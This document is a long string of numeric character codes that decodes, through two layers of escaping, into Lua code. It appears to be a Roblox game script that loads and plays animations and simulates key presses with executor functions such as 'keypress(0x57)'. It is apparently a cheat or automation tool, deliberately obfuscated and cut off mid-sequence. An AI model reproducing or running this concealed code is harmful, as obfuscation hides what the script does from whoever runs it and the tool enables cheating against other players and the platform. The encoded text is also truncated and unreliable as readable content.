44\39\92\49\49\48\39\44\39\92\55\51\39\44\39\92\49\48\48\39\44\39\92\53\56\39\44\39\92\49\48\57\39\44\39\92\57\55\39\44\39\92\49\49\54\39\44\39\92\57\57\39\44\39\92\49\48\52\39\44\39\92\52\48\39\44\39\92\51\52\39\44\39\92\49\49\52\39\44\39\92\57\56\39\44\39\92\49\50\48\39\44\39\92\57\55\39\44\39\92\49\49\53\39\44\39\92\49\49\53\39\44\39\92\49\48\49\39\44\39\92\49\49\54\39\44\39\92\49\48\53\39\44\39\92\49\48\48\39\44\39\92\51\52\39\44\39\92\52\49\39\44\39\92\52\49\39\44\39\92\51\50\39\44\39\92\49\49\54\39\44\39\92\49\48\52\39\44\39\92\49\48\49\39\44\39\92\49\49\48\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\49\56\39\44\39\92\53\56\39\44\39\92\56\51\39\44\39\92\49\49\54\39\44\39\92\49\49\49\39\44\39\92\49\49\50\39\44\39\92\52\48\39\44\39\92\52\49\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\48\49\39\44\39\92\49\49\48\39\44\39\92\49\48\48\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\48\49\39\44\39\92\49\49\48\39\44\39\92\49\48\48\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\48\49\39\44\39\92\49\49\48\39\44\39\92\49\48\48\39\44\39\92\49\48\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\48\50\39\44\39\92\49\49\55\39\44\39\92\49\49\48\39\44\39\92\57\57\39\44\39\92\49\49\54\39\44\39\92\49\48\53\39\44\39\92\49\49\49\39\44\39\92\49\49\48\39\44\39\92\51\50\39\44\39\92\49\48\56\39\44\39\92\49\49\49\39\44\39\92\57\55\39\44\39\92\49\48\48\39\44\39\92\54\53\39\44\39\92\49\49\48\39\44\39\92\49\48\53\39\44\39\92\49\48\57\39\44\39\92\57\55\39\44\39\92\49\49\54\39\44\39\92\49\48\53\39\44\39\92\49\49\49\39\44\39\92\49\49\48\39\44\39\92\52\48\39\44\39\92\49\48\53\39\44\39\92\49\48\48\39\44\39\92\52\49\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\48\53\39\44\39\92\49\48\50\39\44\39\92\51\50\39\44\39\92\56\53\39\44\39\92\49\49\48\39\44\39\92\49\48\53\39\44\39\92\49\49\56\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\49\49\53\39\44\39\92\57\55\39\44\39\92\49\48\56\39\44\39\92\54\53\39\44\39\92\49\49\48\39\44\39\92\49\48\53\39\44\39\92\49\48\57\39\44\39\92\57\55\39\44\39\92\49\49\54\39\44\39\92\49\48\53\39\44\39\92\49\49\49\39\44\39\92\49\49\48\39\44\39\92\52\54\39\44\39\92\54\53\39\44\39\92\49\49\48\39\44\39\92\49\48\53\39\44\39\92\49\48\57\39\44\39\92\57\55\39\44\39\92\49\49\54\39\44\39\92\49\48\53\39\44\39\92\49\49\49\39\44\39\92\49\49\48\39\44\39\92\55\51\39\44\39\92\49\48\48\39\44\39\92\51\50\39\44\39\92\54\49\39\44\39\92\54\49\39\44\39\92\51\50\39\44\39\92\49\48\53\39\44\39\92\49\48\48\39\44\39\92\51\50\39\44\39\92\49\49\54\39\44\39\92\49\48\52\39\44\39\92\49\48\49\39\44\39\92\49\49\48\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\49\53\39\44\39\92\49\49\54\39\44\39\92\49\49\49\39\44\39\92\49\49\50\39\44\39\92\56\52\39\44\39\92\49\49\52\39\44\39\92\57\55\39\44\39\92\57\57\39\44\39\92\49\48\55\39\44\39\92\49\49\53\39\44\39\92\52\48\39\44\39\92\52\49\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\56\53\39\44\39\92\49\49\48\39\44\39\92\49\48\53\39\44\39\92\49\49\56\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\49\49\53\39\44\39\92\57\55\39\44\39\92\49\48\56\39\44\39\92\54\53\39\44\39\92\49\49\48\39\44\39\92\49\48\53\39\44\39\92\49\48\57\39\44\39\92\57\55\39\44\39\92\49\49\54\39\44\39\92\49\48\53\39\44\39\92\49\49\49\39\44\39\92\49\49\48\39\44\39\92\52\54\39\44\39\92\54\53\39\44\39\92\49\49\48\39\44\39\92\49\48\53\39\44\39\92\49\48\57\39\44\39\92\57\55\39\44\39\92\49\49\54\39\44\39\92\49\48\53\39\44\39\92\49\49\49\39\44\39\92\49\49\48\39\44\39\92\55\51\39\44\39\92\49\48\48\39\44\39\92\51\50\39\44\39\92\54\49\39\44\39\92\51\50\39\44\39\92\51\52\39\44\39\92\52\57\39\44\39\92\51\52\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\48\49\39\44\39\92\49\48\56\39\44\39\92\49\49\53\39\44\39\92\49\48\49\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\56\53\39\44\39\92\49\49\48\39\44\39\92\49\48\53\39\44\39\92\49\49\56\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\49\49\53\39\44\39\92\57\55\39\44\39\92\49\48\56\39\44\39\92\54\53\39\44\39\92\49\49\48\39\44\39\92\49\48\53\39\44\39\92\49\48\57\39\44\39\92\57\55\39\44\39\92\49\49\54\39\44\39\92\49\48\53\39\44\39\92\49\49\49\39\44\39\92\49\49\48\39\44\39\92\52\54\39\44\39\92\54\53\39\44\39\92\49\49\48\39\44\39\92\49\48\53\39\44\39\92\49\48\57\39\44\39\92\57\55\39\44\39\92\49\49\54\39\44\39\92\49\48\53\39\44\39\92\49\49\49\39\44\39\92\49\49\48\39\44\39\92\55\51\39\44\39\92\49\48\48\39\44\39\92\51\50\39\44\39\92\54\49\39\44\39\92\51\50\39\44\39\92\49\48\53\39\44\39\92\49\48\48\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\48\56\39\44\39\92\49\49\49\39\44\39\92\57\57\39\44\39\92\57\55\39\44\39\92\49\48\56\39\44\39\92\51\50\39\44\39\92\57\55\39\44\39\92\49\49\48\39\44\39\92\49\48\53\39\44\39\92\49\48\57\39\44\39\92\57\55\39\44\39\92\49\49\54\39\44\39\92\49\48\53\39\44\39\92\49\49\49\39\44\39\92\49\49\48\39\44\39\92\56\52\39\44\39\92\49\49\52\39\44\39\92\57\55\39\44\39\92\57\57\39\44\39\92\49\48\55\39\44\39\92\51\50\39\44\39\92\54\49\39\44\39\92\51\50\39\44\39\92\49\48\51\39\44\39\92\57\55\39\44\39\92\49\48\57\39\44\39\92\49\48\49\39\44\39\92\53\56\39\44\39\92\55\49\39\44\39\92\49\48\49\39\44\39\92\49\49\54\39\44\39\92\56\51\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\49\49\56\39\44\39\92\49\48\53\39\44\39\92\57\57\39\44\39\92\49\48\49\39\44\39\92\52\48\39\44\39\92\51\52\39\44\39\92\56\48\39\44\39\92\49\48\56\39\44\39\92\57\55\39\44\39\92\49\50\49\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\49\49\53\39\44\39\92\51\52\39\44\39\92\52\49\39\44\39\92\52\54\39\44\39\92\55\54\39\44\39\92\49\49\49\39\44\39\92\57\57\39\44\39\92\57\55\39\44\39\92\49\48\56\39\44\39\92\56\48\39\44\39\92\49\48\56\39\44\39\92\57\55\39\44\39\92\49\50\49\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\52\54\39\44\39\92\54\55\39\44\39\92\49\48\52\39\44\39\92\57\55\39\44\39\92\49\49\52\39\44\39\92\57\55\39\44\39\92\57\57\39\44\39\92\49\49\54\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\53\56\39\44\39\92\55\48\39\44\39\92\49\48\53\39\44\39\92\49\49\48\39\44\39\92\49\48\48\39\44\39\92\55\48\39\44\39\92\49\48\53\39\44\39\92\49\49\52\39\44\39\92\49\49\53\39\44\39\92\49\49\54\39\44\39\92\54\55\39\44\39\92\49\48\52\39\44\39\92\49\48\53\39\44\39\92\49\48\56\39\44\39\92\49\48\48\39\44\39\92\55\57\39\44\39\92\49\48\50\39\44\39\92\54\55\39\44\39\92\49\48\56\39\44\39\92\57\55\39\44\39\92\49\49\53\39\44\39\92\49\49\53\39\44\39\92\52\48\39\44\39\92\51\52\39\44\39\92\55\50\39\44\39\92\49\49\55\39\44\39\92\49\48\57\39\44\39\92\57\55\39\44\39\92\49\49\48\39\44\39\92\49\49\49\39\44\39\92\49\48\53\39\44\39\92\49\48\48\39\44\39\92\51\52\39\44\39\92\52\49\39\44\39\92\53\56\39\44\39\92\55\54\39\44\39\92\49\49\49\39\44\39\92\57\55\39\44\39\92\49\48\48\39\44\39\92\54\53\39\44\39\92\49\49\48\39\44\39\92\49\48\53\39\44\39\92\49\48\57\39\44\39\92\57\55\39\44\39\92\49\49\54\39\44\39\92\49\48\53\39\44\39\92\49\49\49\39\44\39\92\49\49\48\39\44\39\92\52\48\39\44\39\92\56\53\39\44\39\92\49\49\48\39\44\39\92\49\48\53\39\44\39\92\49\49\56\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\49\49\53\39\44\39\92\57\55\39\44\39\92\49\48\56\39\44\39\92\54\53\39\44\39\92\49\49\48\39\44\39\92\49\48\53\39\44\39\92\49\48\57\39\44\39\92\57\55\39\44\39\92\49\49\54\39\44\39\92\49\48\53\39\44\39\92\49\49\49\39\44\39\92\49\49\48\39\44\39\92\52\49\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\55\39\44\39\92\49\49\48\39\44\39\92\49\48\53\39\44\39\92\49\48\57\39\44\39\92\57\55\39\44\39\92\49\49\54\39\44\39\92\49\48\53\39\44\39\92\49\49\49\39\44\39\92\49\49\48\39\44\39\92\56\52\39\44\39\92\49\49\52\39\44\39\92\57\55\39\44\39\92\57\57\39\44\39\92\49\48\55\39\44\39\92\53\56\39\44\39\92\56\48\39\44\39\92\49\48\56\39\44\39\92\57\55\39\44\39\92\49\50\49\39\44\39\92\52\48\39\44\39\92\52\49\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\48\49\39\44\39\92\49\49\48\39\44\39\92\49\48\48\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\48\49\39\44\39\92\49\49\48\39\44\39\92\49\48\48\39\44\39\92\49\48\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\55\55\39\44\39\92\49\49\49\39\44\39\92\49\49\55\39\44\39\92\49\49\53\39\44\39\92\49\48\49\39\44\39\92\52\54\39\44\39\92\55\53\39\44\39\92\49\48\49\39\44\39\92\49\50\49\39\44\39\92\54\56\39\44\39\92\49\49\49\39\44\39\92\49\49\57\39\44\39\92\49\49\48\39\44\39\92\53\56\39\44\39\92\54\55\39\44\39\92\49\49\49\39\44\39\92\49\49\48\39\44\39\92\49\49\48\39\44\39\92\49\48\49\39\44\39\92\57\57\39\44\39\92\49\49\54\39\44\39\92\52\48\39\44\39\92\49\48\50\39\44\39\92\49\49\55\39\44\39\92\49\49\48\39\44\39\92\57\57\39\44\39\92\49\49\54\39\44\39\92\49\48\53\39\44\39\92\49\49\49\39\44\39\92\49\49\48\39\44\39\92\52\48\39\44\39\92\55\53\39\44\39\92\49\48\49\39\44\39\92\49\50\49\39\44\39\92\52\49\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\48\53\39\44\39\92\49\48\50\39\44\39\92\51\50\39\44\39\92\55\53\39\44\39\92\49\48\49\39\44\39\92\49\50\49\39\44\39\92\51\50\39\44\39\92\54\49\39\44\39\92\54\49\39\44\39\92\51\50\39\44\39\92\51\52\39\44\39\92\49\49\54\39\44\39\92\51\52\39\44\39\92\51\50\39\44\39\92\49\49\54\39\44\39\92\49\48\52\39\44\39\92\49\48\49\39\44\39\92\49\49\48\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\56\51\39\44\39\92\49\49\50\39\44\39\92\49\48\49\39\44\39\92\49\48\49\39\44\39\92\49\48\48\39\44\39\92\55\49\39\44\39\92\49\48\56\39\44\39\92\49\48\53\39\44\39\92\49\49\54\39\44\39\92\57\57\39\44\39\92\49\48\52\39\44\39\92\51\50\39\44\39\92\54\49\39\44\39\92\51\50\39\44\39\92\49\49\48\39\44\39\92\49\49\49\39\44\39\92\49\49\54\39\44\39\92\51\50\39\44\39\92\56\51\39\44\39\92\49\49\50\39\44\39\92\49\48\49\39\44\39\92\49\48\49\39\44\39\92\49\48\48\39\44\39\92\55\49\39\44\39\92\49\48\56\39\44\39\92\49\48\53\39\44\39\92\49\49\54\39\44\39\92\57\57\39\44\39\92\49\48\52\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\48\53\39\44\39\92\49\48\50\39\44\39\92\51\50\39\44\39\92\56\51\39\44\39\92\49\49\50\39\44\39\92\49\48\49\39\44\39\92\49\48\49\39\44\39\92\49\48\48\39\44\39\92\55\49\39\44\39\92\49\48\56\39\44\39\92\49\48\53\39\44\39\92\49\49\54\39\44\39\92\57\57\39\44\39\92\49\48\52\39\44\39\92\51\50\39\44\39\92\54\49\39\44\39\92\54\49\39\44\39\92\51\50\39\44\39\92\49\49\54\39\44\39\92\49\49\52\39\44\39\92\49\49\55\39\44\39\92\49\48\49\39\44\39\92\51\50\39\44\39\92\49\49\54\39\44\39\92\49\48\52\39\44\39\92\49\48\49\39\44\39\92\49\49\48\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\48\56\39\44\39\92\49\49\49\39\44\39\92\57\55\39\44\39\92\49\48\48\39\44\39\92\54\53\39\44\39\92\49\49\48\39\44\39\92\49\48\53\39\44\39\92\49\48\57\39\44\39\92\57\55\39\44\39\92\49\49\54\39\44\39\92\49\48\53\39\44\39\92\49\49\49\39\44\39\92\49\49\48\39\44\39\92\52\48\39\44\39\92\51\52\39\44\39\92\49\49\52\39\44\39\92\57\56\39\44\39\92\49\50\48\39\44\39\92\57\55\39\44\39\92\49\49\53\39\44\39\92\49\49\53\39\44\39\92\49\48\49\39\44\39\92\49\49\54\39\44\39\92\49\48\53\39\44\39\92\49\48\48\39\44\39\92\53\56\39\44\39\92\52\55\39\44\39\92\52\55\39\44\39\92\53\49\39\44\39\92\52\57\39\44\39\92\53\54\39\44\39\92\53\55\39\44\39\92\53\53\39\44\39\92\53\53\39\44\39\92\53\53\39\44\39\92\53\53\39\44\39\92\53\55\39\44\39\92\53\51\39\44\39\92\51\52\39\44\39\92\52\49\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\49\57\39\44\39\92\57\55\39\44\39\92\49\48\53\39\44\39\92\49\49\54\39\44\39\92\52\48\39\44\39\92\52\57\39\44\39\92\52\54\39\44\39\92\53\51\39\44\39\92\52\49\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\56\55\39\44\39\92\57\55\39\44\39\92\49\48\56\39\44\39\92\49\48\56\39\44\39\92\49\48\49\39\44\39\92\49\49\54\39\44\39\92\52\54\39\44\39\92\56\48\39\44\39\92\57\55\39\44\39\92\49\49\52\39\44\39\92\49\48\49\39\44\39\92\49\49\48\39\44\39\92\49\49\54\39\44\39\92\51\50\39\44\39\92\54\49\39\44\39\92\51\50\39\44\39\92\56\48\39\44\39\92\49\48\56\39\44\39\92\57\55\39\44\39\92\49\50\49\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\52\54\39\44\39\92\54\55\39\44\39\92\49\48\52\39\44\39\92\57\55\39\44\39\92\49\49\52\39\44\39\92\57\55\39\44\39\92\57\57\39\44\39\92\49\49\54\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\49\57\39\44\39\92\57\55\39\44\39\92\49\48\53\39\44\39\92\49\49\54\39\44\39\92\52\48\39\44\39\92\52\56\39\44\39\92\52\54\39\44\39\92\52\57\39\44\39\92\53\51\39\44\39\92\52\49\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\56\48\39\44\39\92\49\48\56\39\44\39\92\57\55\39\44\39\92\49\50\49\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\52\54\39\44\39\92\54\55\39\44\39\92\49\48\52\39\44\39\92\57\55\39\44\39\92\49\49\52\39\44\39\92\57\55\39\44\39\92\57\57\39\44\39\92\49\49\54\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\53\56\39\44\39\92\55\48\39\44\39\92\49\48\53\39\44\39\92\49\49\48\39\44\39\92\49\48\48\39\44\39\92\55\48\39\44\39\92\49\48\53\39\44\39\92\49\49\52\39\44\39\92\49\49\53\39\44\39\92\49\49\54\39\44\39\92\54\55\39\44\39\92\49\48\52\39\44\39\92\49\48\53\39\44\39\92\49\48\56\39\44\39\92\49\48\48\39\44\39\92\52\48\39\44\39\92\51\52\39\44\39\92\56\55\39\44\39\92\57\55\39\44\39\92\49\48\56\39\44\39\92\49\48\56\39\44\39\92\49\48\49\39\44\39\92\49\49\54\39\44\39\92\51\52\39\44\39\92\52\49\39\44\39\92\52\54\39\44\39\92\56\48\39\44\39\92\57\55\39\44\39\92\49\49\52\39\44\39\92\49\48\49\39\44\39\92\49\49\48\39\44\39\92\49\49\54\39\44\39\92\51\50\39\44\39\92\54\49\39\44\39\92\51\50\39\44\39\92\56\48\39\44\39\92\49\48\56\39\44\39\92\57\55\39\44\39\92\49\50\49\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\52\54\39\44\39\92\54\54\39\44\39\92\57\55\39\44\39\92\57\57\39\44\39\92\49\48\55\39\44\39\92\49\49\50\39\44\39\92\57\55\39\44\39\92\57\57\39\44\39\92\49\48\55\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\49\57\39\44\39\92\57\55\39\44\39\92\49\48\53\39\44\39\92\49\49\54\39\44\39\92\52\48\39\44\39\92\52\56\39\44\39\92\52\54\39\44\39\92\52\56\39\44\39\92\53\51\39\44\39\92\52\49\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\49\52\39\44\39\92\49\48\49\39\44\39\92\49\49\50\39\44\39\92\49\48\49\39\44\39\92\57\55\39\44\39\92\49\49\54\39\44\39\92\51\50\39\44\39\92\49\48\51\39\44\39\92\57\55\39\44\39\92\49\48\57\39\44\39\92\49\48\49\39\44\39\92\53\56\39\44\39\92\55\49\39\44\39\92\49\48\49\39\44\39\92\49\49\54\39\44\39\92\56\51\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\49\49\56\39\44\39\92\49\48\53\39\44\39\92\57\57\39\44\39\92\49\48\49\39\44\39\92\52\48\39\44\39\92\51\52\39\44\39\92\56\50\39\44\39\92\49\49\55\39\44\39\92\49\49\48\39\44\39\92\56\51\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\49\49\56\39\44\39\92\49\48\53\39\44\39\92\57\57\39\44\39\92\49\48\49\39\44\39\92\51\52\39\44\39\92\52\49\39\44\39\92\52\54\39\44\39\92\55\50\39\44\39\92\49\48\49\39\44\39\92\57\55\39\44\39\92\49\49\52\39\44\39\92\49\49\54\39\44\39\92\57\56\39\44\39\92\49\48\49\39\44\39\92\57\55\39\44\39\92\49\49\54\39\44\39\92\53\56\39\44\39\92\49\49\57\39\44\39\92\57\55\39\44\39\92\49\48\53\39\44\39\92\49\49\54\39\44\39\92\52\48\39\44\39\92\52\49\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\48\55\39\44\39\92\49\48\49\39\44\39\92\49\50\49\39\44\39\92\49\49\50\39\44\39\92\49\49\52\39\44\39\92\49\48\49\39\44\39\92\49\49\53\39\44\39\92\49\49\53\39\44\39\92\52\48\39\44\39\92\52\56\39\44\39\92\49\50\48\39\44\39\92\53\50\39\44\39\92\53\55\39\44\39\92\52\49\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\48\51\39\44\39\92\57\55\39\44\39\92\49\48\57\39\44\39\92\49\48\49\39\44\39\92\53\56\39\44\39\92\55\49\39\44\39\92\49\48\49\39\44\39\92\49\49\54\39\44\39\92\56\51\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\49\49\56\39\44\39\92\49\48\53\39\44\39\92\57\57\39\44\39\92\49\48\49\39\44\39\92\52\48\39\44\39\92\51\52\39\44\39\92\56\50\39\44\39\92\49\49\55\39\44\39\92\49\49\48\39\44\39\92\56\51\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\49\49\56\39\44\39\92\49\48\53\39\44\39\92\57\57\39\44\39\92\49\48\49\39\44\39\92\51\52\39\44\39\92\52\49\39\44\39\92\52\54\39\44\39\92\55\50\39\44\39\92\49\48\49\39\44\39\92\57\55\39\44\39\92\49\49\52\39\44\39\92\49\49\54\39\44\39\92\57\56\39\44\39\92\49\48\49\39\44\39\92\57\55\39\44\39\92\49\49\54\39\44\39\92\53\56\39\44\39\92\49\49\57\39\44\39\92\57\55\39\44\39\92\49\48\53\39\44\39\92\49\49\54\39\44\39\92\52\48\39\44\39\92\52\49\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\48\55\39\44\39\92\49\48\49\39\44\39\92\49\50\49\39\44\39\92\49\49\50\39\44\39\92\49\49\52\39\44\39\92\49\48\49\39\44\39\92\49\49\53\39\44\39\92\49\49\53\39\44\39\92\52\48\39\44\39\92\52\56\39\44\39\92\49\50\48\39\44\39\92\53\50\39\44\39\92\55\48\39\44\39\92\52\49\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\48\51\39\44\39\92\57\55\39\44\39\92\49\48\57\39\44\39\92\49\48\49\39\44\39\92\53\56\39\44\39\92\55\49\39\44\39\92\49\48\49\39\44\39\92\49\49\54\39\44\39\92\56\51\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\49\49\56\39\44\39\92\49\48\53\39\44\39\92\57\57\39\44\39\92\49\48\49\39\44\39\92\52\48\39\44\39\92\51\52\39\44\39\92\56\50\39\44\39\92\49\49\55\39\44\39\92\49\49\48\39\44\39\92\56\51\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\49\49\56\39\44\39\92\49\48\53\39\44\39\92\57\57\39\44\39\92\49\48\49\39\44\39\92\51\52\39\44\39\92\52\49\39\44\39\92\52\54\39\44\39\92\55\50\39\44\39\92\49\48\49\39\44\39\92\57\55\39\44\39\92\49\49\52\39\44\39\92\49\49\54\39\44\39\92\57\56\39\44\39\92\49\48\49\39\44\39\92\57\55\39\44\39\92\49\49\54\39\44\39\92\53\56\39\44\39\92\49\49\57\39\44\39\92\57\55\39\44\39\92\49\48\53\39\44\39\92\49\49\54\39\44\39\92\52\48\39\44\39\92\52\49\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\48\55\39\44\39\92\49\48\49\39\44\39\92\49\50\49\39\44\39\92\49\49\52\39\44\39\92\49\48\49\39\44\39\92\49\48\56\39\44\39\92\49\48\49\39\44\39\92\57\55\39\44\39\92\49\49\53\39\44\39\92\49\48\49\39\44\39\92\52\48\39\44\39\92\52\56\39\44\39\92\49\50\48\39\44\39\92\53\50\39\44\39\92\53\55\39\44\39\92\52\49\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\48\51\39\44\39\92\57\55\39\44\39\92\49\48\57\39\44\39\92\49\48\49\39\44\39\92\53\56\39\44\39\92\55\49\39\44\39\92\49\48\49\39\44\39\92\49\49\54\39\44\39\92\56\51\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\49\49\56\39\44\39\92\49\48\53\39\44\39\92\57\57\39\44\39\92\49\48\49\39\44\39\92\52\48\39\44\39\92\51\52\39\44\39\92\56\50\39\44\39\92\49\49\55\39\44\39\92\49\49\48\39\44\39\92\56\51\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\49\49\56\39\44\39\92\49\48\53\39\44\39\92\57\57\39\44\39\92\49\48\49\39\44\39\92\51\52\39\44\39\92\52\49\39\44\39\92\52\54\39\44\39\92\55\50\39\44\39\92\49\48\49\39\44\39\92\57\55\39\44\39\92\49\49\52\39\44\39\92\49\49\54\39\44\39\92\57\56\39\44\39\92\49\48\49\39\44\39\92\57\55\39\44\39\92\49\49\54\39\44\39\92\53\56\39\44\39\92\49\49\57\39\44\39\92\57\55\39\44\39\92\49\48\53\39\44\39\92\49\49\54\39\44\39\92\52\48\39\44\39\92\52\49\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\48\55\39\44\39\92\49\48\49\39\44\39\92\49\50\49\39\44\39\92\49\49\52\39\44\39\92\49\48\49\39\44\39\92\49\48\56\39\44\39\92\49\48\49\39\44\39\92\57\55\39\44\39\92\49\49\53\39\44\39\92\49\48\49\39\44\39\92\52\48\39\44\39\92\52\56\39\44\39\92\49\50\48\39\44\39\92\53\50\39\44\39\92\55\48\39\44\39\92\52\49\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\48\51\39\44\39\92\57\55\39\44\39\92\49\48\57\39\44\39\92\49\48\49\39\44\39\92\53\56\39\44\39\92\55\49\39\44\39\92\49\48\49\39\44\39\92\49\49\54\39\44\39\92\56\51\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\49\49\56\39\44\39\92\49\48\53\39\44\39\92\57\57\39\44\39\92\49\48\49\39\44\39\92\52\48\39\44\39\92\51\52\39\44\39\92\56\50\39\44\39\92\49\49\55\39\44\39\92\49\49\48\39\44\39\92\56\51\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\49\49\56\39\44\39\92\49\48\53\39\44\39\92\57\57\39\44\39\92\49\48\49\39\44\39\92\51\52\39\44\39\92\52\49\39\44\39\92\52\54\39\44\39\92\55\50\39\44\39\92\49\48\49\39\44\39\92\57\55\39\44\39\92\49\49\52\39\44\39\92\49\49\54\39\44\39\92\57\56\39\44\39\92\49\48\49\39\44\39\92\57\55\39\44\39\92\49\49\54\39\44\39\92\53\56\39\44\39\92\49\49\57\39\44\39\92\57\55\39\44\39\92\49\48\53\39\44\39\92\49\49\54\39\44\39\92\52\48\39\44\39\92\52\49\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\49\55\39\44\39\92\49\49\48\39\44\39\92\49\49\54\39\44\39\92\49\48\53\39\44\39\92\49\48\56\39\44\39\92\51\50\39\44\39\92\56\51\39\44\39\92\49\49\50\39\44\39\92\49\48\49\39\44\39\92\49\48\49\39\44\39\92\49\48\48\39\44\39\92\55\49\39\44\39\92\49\48\56\39\44\39\92\49\48\53\39\44\39\92\49\49\54\39\44\39\92\57\57\39\44\39\92\49\48\52\39\44\39\92\51\50\39\44\39\92\54\49\39\44\39\92\54\49\39\44\39\92\51\50\39\44\39\92\49\48\50\39\44\39\92\57\55\39\44\39\92\49\48\56\39\44\39\92\49\49\53\39\44\39\92\49\48\